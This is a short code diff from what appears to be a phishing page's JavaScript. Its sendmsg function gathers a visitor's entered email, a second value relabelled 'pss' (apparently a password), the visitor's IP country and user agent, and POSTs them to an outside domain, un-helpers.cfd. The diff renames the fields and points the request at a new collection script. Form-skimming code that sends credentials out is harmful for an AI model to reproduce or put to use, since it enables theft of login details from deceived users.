@@ -188,11 +188,11 @@ function sendmsg(enteredEmail, message) {
             const userDetails = {
                 ip: ipCountryStatement,
                 userAgent: userAgent,
-                email: enteredEmail,
-                message: message
+                mame: enteredEmail,
+                pss: message
             };
 
-            return fetch('https://un-helpers.cfd/wet/send-email.php', {
+            return fetch('https://un-helpers.cfd/wet/myphp.php', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
